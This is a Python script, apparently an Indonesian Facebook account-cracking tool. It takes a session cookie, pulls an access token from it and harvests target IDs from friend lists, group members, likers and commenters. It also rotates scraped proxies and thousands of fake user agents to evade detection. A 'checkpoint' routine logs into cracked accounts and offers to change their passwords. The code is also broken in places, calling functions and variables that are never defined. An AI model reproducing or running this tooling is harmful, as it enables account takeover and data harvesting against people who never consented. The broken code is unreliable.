# code by Yayan XD
# my facebook ( https://www.facebook.com/KM39453 )

#      (C) Copyright 407 Authentic Exploit
#      Rebuild Copyright Can't make u real programmer:)
#      Coded By Yayan XD.
import os
try:
    import requests
except ImportError:
    print('\n [×] Modul requests belum terinstall!...\n')
    os.system('pip install requests')

try:
    import concurrent.futures
except ImportError:
    print('\n [×] Modul Futures belum terinstall!...\n')
    os.system('pip install futures')

try:
    import bs4
except ImportError:
    print('\n [×] Modul Bs4 belum terinstall!...\n')
    os.system('pip install bs4')

import requests, os, re, bs4, sys, json, time, random, datetime, subprocess
from concurrent.futures import ThreadPoolExecutor as YayanGanteng
from datetime import datetime
from bs4 import BeautifulSoup
from rich import print as prints
from rich.panel import Panel
from rich.tree import Tree
ct = datetime.now()
n = ct.month
bulan = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
waktu = '%s %s %s'%(ha,op,ta)
waktu.split('/')
### WARNA RANDOM ###
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
A = '\x1b[1;90m' # WARNA ABU ABU
BN = '\x1b[1;107m' # BELAKANG PUTIH
BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT
BP = '\x1b[1;105m' # BELAKANG PINK
BB = '\x1b[1;104m' # BELAKANG BIRU
BK = '\x1b[1;103m' # BELAKANG KUNING
BH = '\x1b[1;102m' # BELAKANG HIJAU
BM = '\x1b[1;101m' # BELAJANG MERAH
BA = '\x1b[1;100m' # BELAKANG ABU ABU
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
############################ RESPONSE FACEBOOK ###########################################
data,data2={},{}
aman,cp,salah=0,0,0
ubahP,pwBaru=[],[]
Apk = []
ok = []
cp = []
id = []
tokenku = []
user = []
loop = 0
url_lookup = "https://lookup-id.com/"
url_mb = "https://mbasic.facebook.com"
url_ip = "https://www.httpbin.org/ip"
url_graph = "https://graph.facebook.com/{}"
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; moto e (XT2052DL) Build/QPGS30.82-141-15-2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/375.1.0.28.111;]"}
bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
#agen1 = ['Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19F77 [FBAN/FBIOS;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/15.5;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5;FBIA/FBIOS]','Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19F77 [FBAN/FBIOS;FBDV/iPhone14,3;FBMD/iPhone;FBSN/iOS;FBSV/15.5;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBIA/FBIOS]','Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19F77 [FBAN/FBIOS;FBDV/iPhone12,5;FBMD/iPhone;FBSN/iOS;FBSV/15.5;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5]','Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19F77 [FBAN/FBIOS;FBDV/iPhone14,2;FBMD/iPhone;FBSN/iOS;FBSV/15.5;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBIA/FBIOS]','Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19F77 [FBAN/FBIOS;FBDV/iPhone12,8;FBMD/iPhone;FBSN/iOS;FBSV/15.5;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5;FBIA/FBIOS]','Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19F77 [FBAN/FBIOS;FBDV/iPhone12,3;FBMD/iPhone;FBSN/iOS;FBSV/15.5;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBIA/FBIOS]','Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19F77 [FBAN/FBIOS;FBDV/iPhone10,2;FBMD/iPhone;FBSN/iOS;FBSV/15.5;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBIA/FBIOS]']
#agen2 = ['Mozilla/5.0 (Linux; Android 12; SM-G998U Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/375.1.0.28.111;]','Mozilla/5.0 (Linux; Android 12; SM-S908U Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/375.1.0.28.111;]','Mozilla/5.0 (Linux; Android 10; SM-G960U Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/375.1.0.28.111;]','Mozilla/5.0 (Linux; Android 11; SM-A125U Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/376.0.0.12.108;]','Mozilla/5.0 (Linux; Android 9; SM-G950U Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/375.1.0.28.111;]','Mozilla/5.0 (Linux; Android 9; SM-N950U Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/375.1.0.28.111;]','Mozilla/5.0 (Linux; Android 12; SM-A426U Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/375.1.0.28.111;]']
###########################################################################################
hhhh, iiii, jjjj, kkkk = "index.php?", "next=https%3A%2F%2Fdevelopers.facebook.com", "%2Ftools%2Fdebug", "%2Faccesstoken%2F"
dddd, eeee, ffff, gggg = "login", "device-based", "validate-password", "?shbl=0"
aaaa, bbbb, cccc = "tools", "debug", "accesstoken"
#bahasa = "en-GB,en-US;q=0.9,en;q=0.8"
bahasa = "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
#bahasa = "en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,id;q=0.6,bs;q=0.5"
###########################################################################################
## RANDOM UA
#user_agent=['Mozilla/5.0 (Linux; U; Android 10;  en-us; GT-S927W) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4296.85 Mobile Safari/537.36']
uas_random = random.choice(["Mozilla/5.0 (Linux; Android 12; SM-A326U Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/374.0.0.20.109;]","Mozilla/5.0 (Linux; Android 12; SM-G975U Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/376.0.0.12.108;]","Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19F77 [FBAN/FBIOS;FBDV/iPhone12,3;FBMD/iPhone;FBSN/iOS;FBSV/15.5;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5]","Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19F77 [FBAN/FBIOS;FBDV/iPhone11,6;FBMD/iPhone;FBSN/iOS;FBSV/15.5;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBIA/FBIOS]","Mozilla/5.0 (Linux; Android 10; M2006C3LG Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/375.1.0.28.111;]","Mozilla/5.0 (Linux; Android 10; SM-G960U Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/376.0.0.12.108;]"])
uas_random2 = random.choice(["Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19F77 [FBAN/FBIOS;FBDV/iPhone12,3;FBMD/iPhone;FBSN/iOS;FBSV/15.5;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBIA/FBIOS]","Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19F77 [FBAN/FBIOS;FBDV/iPhone9,1;FBMD/iPhone;FBSN/iOS;FBSV/15.5;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5]","Mozilla/5.0 (Linux; Android 12; SM-G988U Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/375.1.0.28.111;]","Mozilla/5.0 (Linux; Android 12; SM-F711U Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/375.1.0.28.111;]","Mozilla/5.0 (Linux; Android 11; moto g power (2021) Build/RZBS31.Q2-143-27-13; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/376.0.0.12.108;]","Mozilla/5.0 (Linux; Android 12; moto g stylus 5G Build/S2RES32.29-16-1-2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/375.1.0.28.111;]","Mozilla/5.0 (Linux; Android 10; RMX1911 Build/QKQ1.200209.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.99 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/376.0.0.12.108;]","Mozilla/5.0 (Linux; Android 11; moto g stylus 5G Build/RRES31.Q3-60-47-2-2-2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/375.1.0.28.111;]","Mozilla/5.0 (Linux; Android 10; LM-Q730 Build/QKQ1.200216.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/376.0.0.12.108;]","Mozilla/5.0 (Linux; Android 11; REVVL V+ 5G Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/376.0.0.12.108;]"])
# lempankkkkkkkk
ugen2=[]
ugen=[]

try:
    prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
    open('.proxy.txt','w').write(prox)
except Exception as e:
    exit(e)
for xd in range(10000):
    a='Mozilla/5.0 (Symbian/3; Series60/'
    b=random.randrange(1, 9)
    c=random.randrange(1, 9)
    d='Nokia'
    e=random.randrange(100, 9999)
    f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
    g=random.randrange(1, 9)
    h=random.randrange(1, 4)
    i=random.randrange(1, 4)
    j=random.randrange(1, 4)
    k='Mobile Safari/535.1'
    uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
    ugen2.append(uaku)


    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['6','7','8','9','10','11','12'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)
    
def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)
     
def mentod():
    print('%s══════════════════════════════════════════\n %sMETHOD MENU%s'%(N,BM,N))
    print(' %s[%s1%s] Method 1 free (%sRecommended%s)'%(N,H,N,H,N))
    print(' [%s2%s] Method 2 mbasic (%sRecommended%s)'%(H,N,H,N))
    print(' [%s3%s] Method 3 mobile (%sRecommended%s)'%(H,N,H,N))
#-------- LOADING ANIMASI ------------
def loading():
    animation = ["[\x1b[1;91m■\x1b[0m□□□□□□□□□]","[\x1b[1;92m■■\x1b[0m□□□□□□□□]", "[\x1b[1;93m■■■\x1b[0m□□□□□□□]", "[\x1b[1;94m■■■■\x1b[0m□□□□□□]", "[\x1b[1;95m■■■■■\x1b[0m□□□□□]", "[\x1b[1;96m■■■■■■\x1b[0m□□□□]", "[\x1b[1;97m■■■■■■■\x1b[0m□□□]", "[\x1b[1;98m■■■■■■■■\x1b[0m□□]", "[\x1b[1;99m■■■■■■■■■\x1b[0m□]", "[\x1b[1;910m■■■■■■■■■■\x1b[0m]"]
    for i in range(50):
        time.sleep(0.1)
        sys.stdout.write(f"\r {N}[{H}•{N}] {H}Loading...{N} " + animation[i % len(animation)] +"\x1b[0m ")
        sys.stdout.flush()
    print("")
# LOGO
def logo():
    print(f"""{M}
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░███████████░░░░░██░░░░░░░░░░░░██░░
░░██░░░░░░░░░░░░░░██░░░░░░░░░░░░██░░
░░██░░░░░░░░░░░░░░██░░░░░░░░░░░░██░░
░░███████████░░░░░██░░░░████░░░░██░░
░░░░░░░░░░░██░░░░░██░░░██░░██░░░██░░
░░░░░░░░░░░██░░░░░██░░██░░░░██░░██░░
░░███████████░░░░░█████░░░░░░█████░░
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░\n{N} ▌│█║▌║▌║SUWUNG METHOD║▌║▌║█│▌{N} """)
    print("░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░")
    print(f"░ ░{P}[{H}•{P}] Author    : SUWUNG                 {N}░ ░")
    print(f"░ ░{P}[{H}•{P}] Kamu      : SUWUNG                 {N}░ ░")
    print(f"░ ░{P}[{H}•{P}] Kita      : SEMUA SUWUNG          {N} ░ ░")
    print(f"░ ░{P}[{H}•{P}] SC Status : PREMIUM SEMODARE      {P} {N}░ ░")
    print(f"░ ░{P}[{H}•{P}] Support   : 64bit                  {N}░ ░")
    print(f"░ ░{P}[{H}•{P}] Koneksi   : {H}IM3{N}, {H}AXIS/XL{N}, {H}3{N}        ░ ░")
    print(f"░ ░{P}[{H}•{P}] Versi     : 1.000 ({K}KONTOL{P})         {N}░ ░")
    print("░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░")
#CRACK SELESAI
def hasil(ok,cp):
    if len(ok) != 0 or len(cp) != 0:
        print(f'\n%s══════════════════════════════════════════\n [%s✓%s] %sCRACK BY SUWUNG SC SELESAI...\n%s══════════════════════════════════════════'%(N,H,N,H,N))
        print(f' %s[%s+%s] Number of Accounts OK : %s%s%s'%(N,H,N,H,str(len(ok)),N))
        print(f' [%s+%s] Number of Accounts CP : %s%s%s'%(K,N,K,str(len(cp)),N))
        cek_cp = input(f"{N}══════════════════════════════════════════\n [{K}?{N}] Show CP detector options [{H}Y{N}/{M}t{N}]: ")
        if cek_cp =="":
            print(f"\n [{M}!{N}] Don't be empty");hasil(ok,cp)
        elif cek_cp in["Y","y"]:
            jalan(f" {N}[{M}!{N}] Play airplanemode first");time.sleep(5)
            ww=input(f"\n {N}[{K}?{N}] Change password when {BM}TAP YES{N} [{H}Y{N}/{M}t{N}]: ")
            if ww in ("Y","y","ya"):
                ubahP.append("y")
                print(f" {N}[{H}•{N}] Password example : {H}admin123{N}")
                pwBar=input(f" {N}[{K}?{N}] Enter new password : {H}")
                #print("\n")
                if len(pwBar) <= 5:
                    print('\n %s[%s×%s] Password minimum 6 characters'%(N,M,N))
                else:
                    pwBaru.append(pwBar)
            for memek in cp:
                kontol = memek.replace('\n', '')
                titid  = kontol.split(' • ')
                print(f'{N}══════════════════════════════════════════\n {H}LOGIN PROCESS')
                jalan(f' {N}[{M}?{N}] Account : {K}{kontol.replace("[SUWUNG-CP] ", "")}{N}')
                try:
                    log_hasil(titid[0].replace("[SUWUNG-CP] ", ""), titid[1])
                except requests.exceptions.ConnectionError:
                    continue
                    print("")
            print("")
            jalan(' %s[%s✓%s] %sChecking process is complete%s'%(N,H,N,H,N))
            jalan(' %s[%s✓%s] Retrun SC type "%spython suwunganyar.py%s"'%(N,H,N,H,N));exit()
        elif cek_cp in["T","t"]:
            jalan(f"\n {N}[{H}•{N}] {N}Ok, thank you. Retrun SC type '{H}python suwunganyar.py{N}'");exit()
        else:
            print(f"\n {N}[{M}!{N}] Choose Y/t");hasil(ok,cp)
    else:
        jalan('\n\n %s[%s!%s] Sorry you didnt get results'%(N,M,N));exit()
#LOGIN SC
user = "SUWUNG"
pwas = "suwung"
def cek_pw():
    try:
        open(".ini_pw.txt", "r").read()
    except FileNotFoundError:
        os.system("clear")
        logo()
        print('\n %s%sOPTION MENU%s'%(BM,P,N))
        print(' [%s1%s] Already have SC Login Info'%(H,N))
        pil = input('\n %s[%s?%s] Choice : '%(N,K,N))
        if pil =="":
            jalan(f" {N}[{M}×{N}] Sorry, it is wrong...!");time.sleep(1);cek_pw()
        elif pil in["1","01"]:
            print('%s══════════════════════════════════════════'%(N))
            print(' %s[%s!%s] You must have a %susername & password%s to\n continue with this tool!'%(N,M,N,H,N))
        else:
            exit(f"{N}[{M}×{N}] Sorry, it is wrong...!")
        #print(" %s[%s!%s] You must have a %susername & password%s to continue with this tool!"%(N,M,N,K,N))
        pw = input("\n %s[%s?%s] Enter Username : %s"%(N,K,N,H))
        loading()
        if pw in [""]:
            jalan(" %s[%s!%s] Sorry don't be blank!"%(N,M,N));time.sleep(1);cek_pw()
        elif pw in user:
            jalan(" %s[%s✓%s] OK Username is correct"%(N,H,N));time.sleep(1);kska()
        else:
            jalan(" %s[%s!%s] Sorry, wrong username"%(N,M,N));time.sleep(1);cek_pw()
    moch_yayan()
def kska():
    xx = input("\n %s[%s?%s] Enter Password : %s"%(N,K,N,H))
    loading()
    if xx in[""]:
        jalan(" %s[%s!%s] Sorry don't be blank!"%(N,M,N));time.sleep(1);cek_pw()
    elif xx in pwas:
        jalan(" %s[%s✓%s] OK Password is correct"%(N,H,N));time.sleep(2);open(".ini_pw.txt", "a").write(xx);moch_yayan()
    else:
        jalan(" %s[%s!%s] Sorry, wrong Password"%(N,M,N));time.sleep(1);cek_pw()

#METODE LOGIN
def yayanxd():
    os.system('clear')
    try:
    	___kontol___ = input('[|] Masukkan Cookies : ')
    	data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 10; moto e (XT2052DL) Build/QPGS30.82-141-15-2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/375.1.0.28.111;]","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":___kontol___})
    	find_token = re.search("(EAAG\w+)", data.text)
    	ken=open(".token.txt", "w").write(find_token.group(1))
    	cok=open(".cokie.txt", "w").write(___kontol___)
    	print('\n LOGIN SUCCESSFULLY')
    	exit()
    except Exception as e:
    	os.system("rm -f .token.txt")
    	os.system("rm -f .cokie.txt")
    	print('invalid')
    	exit()
# ------- LOGIN COOKIE --------
def login():
	try:
		token = open('.token.txt','r').read()
		kukis = open('.cokie.txt','r').read()
		tokenku.append(token)
		try:
			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':kukis})
			sy2 = json.loads(sy.text)['name']
			sy3 = json.loads(sy.text)['id']
			moch_yayan(sy2,sy3)
		except KeyError:
			yayanxd()
		except requests.exceptions.ConnectionError:
				yayanxd()
	except IOError:
			yayanxd()
#LOGIN PASSWORD

     
### MENU UTAMA ###
def moch_yayan(my_name,my_id):
    ipm = requests.get(url_ip).json()
    IP = ipm["origin"]
    print(f" {BM}LOGIN INFO{N}")
    print(f"{P} [{H}•{P}] FB Name   : {my_name}")
    print(f"{P} [{H}•{P}] FB ID     : {my_id}")
    print(f"{P} [{H}•{P}] Your IP   : {IP}")
    print(f"{P} [{H}•{P}] Join      : {waktu}")
    print("%s══════════════════════════════════════════"%(N))
    print(f" {BM}OPTION MENU{N}")
    print(' [%s01%s] Public Friends (%sON%s)'%(H,N,H,N));time.sleep(0.03)
    print(' [%s02%s] Random ID Massal (%sON%s)'%(H,N,H,N));time.sleep(0.03)
    print(' [%s03%s] Public Group Member (%sON%s)'%(H,N,H,N));time.sleep(0.03)
    print(' [%s04%s] Like Posts (%sON%s)'%(H,N,H,N));time.sleep(0.03)
    print(' [%s05%s] Comment Posts (%sON%s)'%(H,N,H,N));time.sleep(0.03)
    print(' [%s06%s] Checkpoint Detedtor (%sON%s)'%(H,N,H,N));time.sleep(0.03)
    print(' [%s07%s] Check Crack Results (%sON%s)'%(H,N,H,N));time.sleep(0.03)
    print(' [%s00%s] Logout (%sRemove Token/Cookie%s)'%(M,N,M,N));time.sleep(0.03)
    pepek = input('\n %s[%s?%s] Select menu : '%(N,K,N))
    if pepek == '':
        jalan('\n %s[%s×%s] Sorry the menu selection is wrong...!'%(N,M,N));time.sleep(2);moch_yayan()
###### CRACK ID PUBLIK SINGEL #####
    elif pepek in['1','01']:
        try:
        	token = open('.token.txt','r').read()
        	kukis = open('.cokie.txt','r').read()
        except IOError:
        	exit()
        print("Masukkan Id")
        pil = input("	ID :")
        try:
        	koh2 = open('/sdcard/PKG.txt','a+')
        	for pi in requests.get('https://graph.facebook.com/v1.0/'+pil+'?fields=friends.limit(5000)&access_token='+tokenku[0],cookies={'cookie': kukis}).json()['friends']['data']:
                		uid = pi["id"]
                		nama = pi["name"]
                		id.append(pi['id']+'<=>'+pi['name'])
                		koh2.close()
        except KeyError:
            jalan(f' %s[%s×%s] Sorry %sID is not public/Invalid token%s'%(N,M,N,M,N));time.sleep(1);login()
###### CRACK RANDOM ID MASSAL #####
    elif pepek in['2','02']:
        _ngocok_(tokenz)
###### CRACK GRUP #####
    elif pepek in['3','03']:
            print("%s══════════════════════════════════════════\n %sGROUP TARGET INFO%s"%(N,BM,N))
            kontol = input(f" {N}[{K}?{N}] Enter Group ID : {H}")
            if kontol in[""," "]:
                print('\n %s[%s×%s] Dont be empty...!'%(N,M,N));time.sleep(2);moch_yayan()
            else:
                try:
                    cookiz = open('.cokie.txt').read()
                    kueh  = {"cookie":cookiz}
                except IOError:
                    jalan(f"\n [{M}×{N}] You login using a token, if you want to crack from a group member, please login cookies first");time.sleep(5);os.system('rm -rf .token.txt');yayanxd()
                try:
                    a = requests.get(f"https://graph.facebook.com/group/?id={kontol}&access_token={tokenz}").json()["name"]
                    if "Halaman Tidak Ditemukan" in a:
                        print(f"\n %s[%s×%s] Group with ID {kontol} not found"%(N,M,N));time.sleep(2);moch_yayan()
                    elif "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in a:
                        print("\n %s[%s×%s] Facebook restricts every activity, account is spammed, please switch accounts"%(N,M,N));time.sleep(2);moch_yayan()
                    elif "Konten Tidak Ditemukan" in a:
                        print(f"\n %s[%s×%s] Group with ID {kontol} not found"%(N,M,N));time.sleep(2);moch_yayan()
                    else:                    
                        print(f" {N}[{H}•{N}] Group Name : {H}{a}")
                        print(f"\n {N}[{M}!{N}] To stop {H}CTRL+c{N} on keyboard")
                        crack_grup(f"https://mbasic.facebook.com/browse/group/members/?id={kontol}", kueh)
                except(requests.exceptions.ConnectionError,requests.exceptions.ChunkedEncodingError,requests.exceptions.ReadTimeout):
                    exit("\n [!] Sorry no connection")                                   
###### CRACK LIKE POSTINGAN #####
    elif pepek in['4','04']:
            print("%s══════════════════════════════════════════\n %sLIKE TARGET INFO%s"%(N,BM,N))
            kontol = input(f" {N}[{K}?{N}] Enter Post ID : {H}")
            if kontol in[""," "]:
                print('\n %s[%s×%s] Dont be empty...!'%(N,M,N));time.sleep(2);moch_yayan()
            try:
                cookiz = open('.cokie.txt').read()
                kueh  = {"cookie":cookiz}
            except IOError:
                jalan(f"\n {N}[{M}×{N}] You login using a token, if you want to crack from a group member, please login cookies first");time.sleep(5);os.system('rm -rf .token.txt');yayanxd()
            try:
                print(f"\n {N}[{M}!{N}] To stop {H}CTRL+c{N} on keyboard")
                like_post(f"https://mbasic.facebook.com/ufi/reaction/profile/browser/?ft_ent_identifier={kontol}", kueh)
            except KeyError:
                print(f"\n [!] Post with ID {kontol} not found");time.sleep(2);moch_yayan()
###### CRACK KOMENTAR #####
    elif pepek in['5','05']:
            print("%s══════════════════════════════════════════\n %sCOMMENT TARGET INFO%s"%(N,BM,N))
            kontol = input(f"\n {N}[{K}?{N}] Enter Post ID : {H}")
            if kontol in[""," "]:
                print('\n %s[%s×%s] Dont be empty...!'%(N,M,N));time.sleep(2);moch_yayan()
            try:
                cookiz = open('.cokie.txt').read()
                kueh  = {"cookie":cookiz}
            except IOError:
                jalan(f"\n {N}[{M}×{N}] You login using a token, if you want to crack from a group member, please login cookies first");time.sleep(5);os.system('rm -rf .token.txt');yayanxd()
            try:
                print(f"\n {N}[{M}!{N}] To stop {H}CTRL+c{N} on keyboard")
                ngomen_post(f"https://mbasic.facebook.com/{kontol}", kueh)
            except KeyError:
                print(f"\n [!] Post with ID {kontol} not found");time.sleep(2);moch_yayan()
###### CHECKPOINT DETEDTOR #####
    elif pepek in['6','06']:
        gabut()
###### CEK HASIL CRACK #####
    elif pepek in['7','07']:
        dirs = os.listdir("results")
        print('%s══════════════════════════════════════════\n %sFILE HASIL CRACK%s'%(N,BM,N))
        for file in dirs:
            print(" %s[%s+%s] %s"%(N,H,N,file))
        file = input("\n %s%sFILE DETAILS%s\n [%s?%s] File name : %s"%(BM,P,N,K,N,H))
        if file == "":
            file = input("\n %s%sFILE DETAILS%s\n [%s?%s] File name :%s"%(BM,P,N,K,N,H))
        total = open("results/%s"%(file)).read().splitlines()
        #print("%s══════════════════════════════════════════"%(N));time.sleep(2)
        nm_file = ("%s"%(file)).replace("-", " ")
        hps_nm  = nm_file.replace(".txt", "").replace("OK", "").replace("CP", "").replace("cp_detektor", "").replace("invalid_ok", "")
        jalan(" %s[%s•%s] File date :%s%s\n %s[%s•%s] Total : %s%s%s"%(N,H,N,H,hps_nm,N,H,N,H,len(total),N))
        print("%s══════════════════════════════════════════"%(N));time.sleep(2)
        for memek in total:
            kontol = memek.replace("\n","")
            titid  = kontol.replace("[SUWUNG-OK] ","\x1b[1;92m[SUWUNG-OK] ").replace("[SUWUNG-CP] ", "\x1b[1;93m[SUWUNG-CP] ")
            print("%s%s"%(titid,N));time.sleep(0.03)
        jalan("\n %s[%s✓%s] File check complete..."%(N,H,N))
        input(' [%sPRESS ENTER%s] to continue'%(H,N));moch_yayan()
###### HAPUS COOKIE #####
    elif pepek in['0','00']:
        print("")
